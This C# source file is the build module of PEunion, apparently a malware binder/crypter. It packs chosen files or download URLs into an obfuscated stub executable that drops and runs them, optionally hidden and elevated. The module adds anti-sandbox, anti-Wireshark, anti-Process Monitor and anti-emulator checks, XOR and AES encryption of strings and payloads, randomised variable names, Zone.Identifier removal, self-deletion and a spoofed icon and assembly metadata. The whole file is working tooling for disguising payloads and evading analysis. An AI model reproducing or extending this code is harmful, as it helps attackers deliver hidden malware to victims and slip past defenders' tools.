﻿using BytecodeApi;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace PEunion
{
	public static class Builder
	{
		public static async Task<CompilerResults> BuildAsync(string path, Project project) => await Task.Factory.StartNew(() => Build(path, project));
		public static async Task<string> BuildCodeAsync(Project project) => await Task.Factory.StartNew(() => BuildCode(project));

		public static CompilerResults Build(string path, Project project)
		{
			string code = BuildCode(project);

			WindowMain.Singleton.OverlayTitle = "Compiling stub...";
			WindowMain.Singleton.OverlayIsIndeterminate = true;
			string manifestPath = null;

			try
			{
				bool isManifestResource;
				manifestPath = Path.GetTempFileName();
				byte[] manifestFile;
				switch (project.Manifest)
				{
					case BuildManifest.None:
						manifestFile = Properties.Resources.FileManifestNone;
						isManifestResource = true;
						break;
					case BuildManifest.AsInvoker:
						manifestFile = Properties.Resources.FileManifestAsInvoker;
						isManifestResource = false;
						break;
					case BuildManifest.RequireAdministrator:
						manifestFile = Properties.Resources.FileManifestRequireAdministrator;
						isManifestResource = false;
						break;
					default:
						throw new InvalidOperationException();
				}
				File.WriteAllBytes(manifestPath, manifestFile);

				using (CSharpCodeProvider provider = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } }))
				{
					string platformName;
					switch (project.Platform)
					{
						case BuildPlatform.Win32:
							platformName = "x86";
							break;
						case BuildPlatform.Win64:
							platformName = "x64";
							break;
						case BuildPlatform.AnyCPU:
							platformName = "anycpu";
							break;
						default:
							throw new InvalidOperationException();
					}

					CompilerParameters parameters = new CompilerParameters
					{
						GenerateExecutable = true,
						GenerateInMemory = true,
						OutputAssembly = path,
						CompilerOptions = "/nostdlib /target:winexe /platform:" + platformName + (isManifestResource ? null : " /win32manifest:" + manifestPath),
						Win32Resource = isManifestResource ? manifestPath : null
					};

					parameters.ReferencedAssemblies.AddRange(new[]
					{
						"mscorlib.dll",
						"System.dll",
						"System.Core.dll",
						"System.Windows.Forms.dll"
					});

					CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
					if (results.Errors.Count == 0 && project.IconPath != null) new FileInfo(path).ChangeExecutableIcon(new Icon(project.IconPath));
					return results;
				}
			}
			finally
			{
				if (manifestPath != null) File.Delete(manifestPath);
			}
		}
		public static string BuildCode(Project project)
		{
			WindowMain.Singleton.OverlayTitle = "Building code...";
			WindowMain.Singleton.OverlayIsIndeterminate = false;
			WindowMain.Singleton.OverlayProgress = 0;

			long totalSize = project.FileItems.Sum(file => new FileInfo(file.FullName).Length);
			long progress = 0;

			StringBuilder codeFilesPart = new StringBuilder();
			foreach (ProjectItem item in project.Items)
			{
				if (item is ProjectFile file)
				{
					codeFilesPart.AppendLine("\t\tnew __FileItem__ // File");
					codeFilesPart.AppendLine("\t\t{");
					codeFilesPart.AppendLine("\t\t\t__C1_FileName__ = " + CreateStringLiteral(file.Name.Trim(), project.StringEncryption) + ", // FileName: " + CreateCommentLiteral(file.Name.Trim()));
					codeFilesPart.AppendLine("\t\t\t__C1_Compress__ = " + (file.Compress ? "true" : "false") + ", // Compress");
					codeFilesPart.AppendLine("\t\t\t__C1_Encrypt__ = " + (file.Encrypt ? "true" : "false") + ", // Encrypt");
					codeFilesPart.AppendLine("\t\t\t__C1_Hidden__ = " + (file.Hidden ? "true" : "false") + ", // Hidden");
					codeFilesPart.AppendLine("\t\t\t__C1_DropLocation__ = " + file.DropLocation + ", // DropLocation");
					codeFilesPart.AppendLine("\t\t\t__C1_DropAction__ = " + file.DropAction + ", // DropAction");
					codeFilesPart.AppendLine("\t\t\t__C1_Runas__ = " + (file.Runas ? "true" : "false") + ", // Runas");
					codeFilesPart.AppendLine("\t\t\t__C1_CommandLine__ = " + CreateStringLiteral(file.CommandLine?.Trim(), project.StringEncryption) + ", // CommandLine: " + CreateCommentLiteral(file.CommandLine?.Trim()));
					codeFilesPart.AppendLine("\t\t\t__C1_AntiSandboxie__ = " + (file.AntiSandboxie ? "true" : "false") + ", // AntiSandboxie");
					codeFilesPart.AppendLine("\t\t\t__C1_AntiWireshark__ = " + (file.AntiWireshark ? "true" : "false") + ", // AntiWireshark");
					codeFilesPart.AppendLine("\t\t\t__C1_AntiProcessMonitor__ = " + (file.AntiProcessMonitor ? "true" : "false") + ", // AntiProcessMonitor");
					codeFilesPart.AppendLine("\t\t\t__C1_AntiEmulator__ = " + (file.AntiEmulator ? "true" : "false") + ", // AntiEmulator");
					codeFilesPart.AppendLine("\t\t\t__C1_Content__ = new byte[] // Content");
					codeFilesPart.AppendLine("\t\t\t{");
					byte[] data = File.ReadAllBytes(file.FullName);
					if (file.Compress) data = Compress(data);
					if (file.Encrypt) data = Encrypt(data);

					using (MemoryStream content = new MemoryStream(data))
					{
						int length;
						byte[] buffer = new byte[128];
						do
						{
							length = content.Read(buffer, 0, buffer.Length);
							if (length > 0)
							{
								codeFilesPart.AppendLine("\t\t\t\t" + buffer.Take(length).Select(b => "0x" + b.ToString("x2") + ", ").CreateString().Trim());
							}
							progress += buffer.Length;
							WindowMain.Singleton.OverlayProgress = progress * 100 / totalSize;
						}
						while (length > 0);
					}

					codeFilesPart.AppendLine("\t\t\t}");
				}
				else if (item is ProjectUrl url)
				{
					codeFilesPart.AppendLine("\t\tnew __UrlItem__ // URL");
					codeFilesPart.AppendLine("\t\t{");
					codeFilesPart.AppendLine("\t\t\t__C2_Url__ = " + CreateStringLiteral(url.Url.Trim(), project.StringEncryption) + ", // Url: " + CreateCommentLiteral(url.Url.Trim()));
					codeFilesPart.AppendLine("\t\t\t__C2_FileName__ = " + CreateStringLiteral(url.Name.Trim(), project.StringEncryption) + ", // FileName: " + CreateCommentLiteral(url.Name.Trim()));
					codeFilesPart.AppendLine("\t\t\t__C2_Hidden__ = " + (url.Hidden ? "true" : "false") + ", // Hidden");
					codeFilesPart.AppendLine("\t\t\t__C2_DropLocation__ = " + url.DropLocation + ", // DropLocation");
					codeFilesPart.AppendLine("\t\t\t__C2_DropAction__ = " + url.DropAction + ", // DropAction");
					codeFilesPart.AppendLine("\t\t\t__C2_Runas__ = " + (url.Runas ? "true" : "false") + ", // Runas");
					codeFilesPart.AppendLine("\t\t\t__C2_CommandLine__ = " + CreateStringLiteral(url.CommandLine?.Trim(), project.StringEncryption) + ", // CommandLine: " + CreateCommentLiteral(url.CommandLine?.Trim()));
					codeFilesPart.AppendLine("\t\t\t__C2_AntiSandboxie__ = " + (url.AntiSandboxie ? "true" : "false") + ", // AntiSandboxie");
					codeFilesPart.AppendLine("\t\t\t__C2_AntiWireshark__ = " + (url.AntiWireshark ? "true" : "false") + ", // AntiWireshark");
					codeFilesPart.AppendLine("\t\t\t__C2_AntiProcessMonitor__ = " + (url.AntiProcessMonitor ? "true" : "false") + ", // AntiProcessMonitor");
					codeFilesPart.AppendLine("\t\t\t__C2_AntiEmulator__ = " + (url.AntiEmulator ? "true" : "false") + ", // AntiEmulator");
				}
				else if (item is ProjectMessageBox messageBox)
				{
					codeFilesPart.AppendLine("\t\tnew __MessageBoxItem__ // MessageBox");
					codeFilesPart.AppendLine("\t\t{");
					codeFilesPart.AppendLine("\t\t\t__C3_Title__ = " + CreateStringLiteral(messageBox.Title, project.StringEncryption) + ", // Title: " + CreateCommentLiteral(messageBox.Title));
					codeFilesPart.AppendLine("\t\t\t__C3_Text__ = " + CreateStringLiteral(messageBox.Text, project.StringEncryption) + ", // Text: " + CreateCommentLiteral(messageBox.Text));
					codeFilesPart.AppendLine("\t\t\t__C3_Buttons__ = MessageBoxButtons." + messageBox.Buttons + ", // Buttons");
					codeFilesPart.AppendLine("\t\t\t__C3_Icon__ = MessageBoxIcon." + messageBox.Icon + ", // Icon");
				}
				else
				{
					throw new InvalidOperationException();
				}

				codeFilesPart.AppendLine("\t\t}" + (item == project.Items.Last() ? null : ","));
			}

			WindowMain.Singleton.OverlayTitle = "Preprocessor directives...";
			WindowMain.Singleton.OverlayProgress = 0;

			string codePreprocessorPart = new[]
			{
				(project.StringEncryption ? null : "//") + "#define ENABLE_STRINGENCRYPTION",
				(project.StringLiteralEncryption ? null : "//") + "#define ENABLE_STRINGLITERALENCRYPTION",
				(project.DeleteZoneID ? null : "//") + "#define ENABLE_DELETEZONEID",
				(project.Melt ? null : "//") + "#define ENABLE_MELT",
				(project.FileItems.Any(file => file.Compress) ? null : "//") + "#define ENABLE_COMPRESSION",
				(project.FileItems.Any(file => file.Encrypt) ? null : "//") + "#define ENABLE_ENCRYPTION",
				(project.FileItems.Any(file => file.AntiSandboxie) || project.UrlItems.Any(file => file.AntiSandboxie) ? null : "//") + "#define ENABLE_ANTI_SANDBOXIE",
				(project.FileItems.Any(file => file.AntiWireshark) || project.UrlItems.Any(file => file.AntiWireshark) ? null : "//") + "#define ENABLE_ANTI_WIRESHARK",
				(project.FileItems.Any(file => file.AntiProcessMonitor) || project.UrlItems.Any(file => file.AntiProcessMonitor) ? null : "//") + "#define ENABLE_ANTI_PROCESSMONITOR",
				(project.FileItems.Any(file => file.AntiEmulator) || project.UrlItems.Any(file => file.AntiEmulator) ? null : "//") + "#define ENABLE_ANTI_EMULATOR",
			}.ToMultilineString();

			string assemblyInfoPart;
			if (new[] { project.AssemblyTitle, project.AssemblyProduct, project.AssemblyCopyright, project.AssemblyVersion }.Any(str => !str.IsNullOrEmpty()))
			{
				assemblyInfoPart = "\r\n";
				if (!project.AssemblyTitle.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyTitle(\"" + project.AssemblyTitle + "\")]\r\n";
				if (!project.AssemblyProduct.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyProduct(\"" + project.AssemblyProduct + "\")]\r\n";
				if (!project.AssemblyVersion.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyVersion(\"" + project.AssemblyVersion + "\")]\r\n";
				if (!project.AssemblyCopyright.IsNullOrEmpty()) assemblyInfoPart += "[assembly: AssemblyCopyright(\"" + project.AssemblyCopyright + "\")]\r\n";
			}
			else
			{
				assemblyInfoPart = "";
			}

			string code = Properties.Resources.FileStub;

			code = code
				.Replace("/*{ASSEMBLYINFO}*/", assemblyInfoPart)
				.Replace("/*{PREPROCESSOR}*/", codePreprocessorPart)
				.Replace("/*{ITEMS}*/", codeFilesPart.ToString());

			WindowMain.Singleton.OverlayTitle = "String literal encryption...";
			WindowMain.Singleton.OverlayProgress = 25;

			new Regex(@"\/\*\*\/(""[^""]+"")")
				.Matches(code)
				.Cast<Match>()
				.Where(match => match.Success)
				.ForEach(match =>
				{
					string str = match.Groups[0].Value;
					string stringContent = str.SubstringFrom("\"").SubstringUntil("\"", true);
					code = code.Replace(str, CreateStringLiteral(stringContent, project.StringLiteralEncryption));
				});

			WindowMain.Singleton.OverlayTitle = "Obfuscation...";
			WindowMain.Singleton.OverlayProgress = 50;

			new Regex("__[a-zA-Z0-9_]+__")
				.Matches(code)
				.Cast<Match>()
				.Where(match => match.Success)
				.Select(match => match.Value)
				.ForEach(variable => code = code.Replace(variable, GenerateVariableName(variable, project.Obfuscation)));

			WindowMain.Singleton.OverlayProgress = 100;
			return code.TrimStart();
		}

		private static string GenerateVariableName(string originalVariableName, BuildObfuscationType obfuscation)
		{
			const string specialCharacters = "각갂갃간갅갆갇갈갉갊갋갌갍갎갏감갑값갓갔강갖갗갘같갚갛개객갞갟갠갡갢갣갤갥갦갧갨갩갪갫갬갭갮갯";

			switch (obfuscation)
			{
				case BuildObfuscationType.None:
					return originalVariableName
						.TrimEnd("__")
						.SubstringFrom("_", true);
				case BuildObfuscationType.AlphaNumeric:
					string alphabet = TextResources.Alphabet + TextResources.Alphabet.ToUpper();
					string alphabetWithNumbers = alphabet + "0123456789";

					return Enumerable
						.Range(0, MathEx.Random.Next(10, 20))
						.Select(i => MathEx.Random.NextObject((i == 0 ? alphabet : alphabetWithNumbers).ToCharArray()))
						.CreateString();
				case BuildObfuscationType.Special:
					return Enumerable
						.Range(0, MathEx.Random.Next(10, 20))
						.Select(i => MathEx.Random.NextObject(specialCharacters.ToCharArray()))
						.CreateString();
				default:
					throw new InvalidOperationException();
			}
		}
		private static byte[] Compress(byte[] data)
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
				{
					gzipStream.Write(data);
				}
				return BitConverter.GetBytes(data.Length).Concat(memoryStream.ToArray());
			}
		}
		private static byte[] Encrypt(byte[] data)
		{
			byte[] key = MathEx.RandomNumberGenerator.GetBytes(16);

			using (MemoryStream memoryStream = new MemoryStream())
			{
				memoryStream.Write(key);
				Rijndael aes = Rijndael.Create();
				aes.IV = aes.Key = key;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(data, 0, data.Length);
				}
				return memoryStream.ToArray();
			}
		}
		private static string CreateStringLiteral(string str, bool encrypt)
		{
			str = str ?? "";

			if (encrypt)
			{
				str = str.Replace(@"\\", @"\").Replace("\\\"", "\"");
				byte key = MathEx.Random.NextByte();
				return "__F_DecryptString__(\"\\x" + key.ToString("x") + str.Select(c => @"\x" + (c ^ key).ToString("x")).CreateString() + "\")";
			}
			else
			{
				return "\"" + str.Replace("\"", "\\\"").Replace("\r", @"\r").Replace("\n", @"\n") + "\"";
			}
		}
		private static string CreateCommentLiteral(string str)
		{
			return str?.Replace("\r", @"\r").Replace("\n", @"\n") ?? "";
		}
	}
}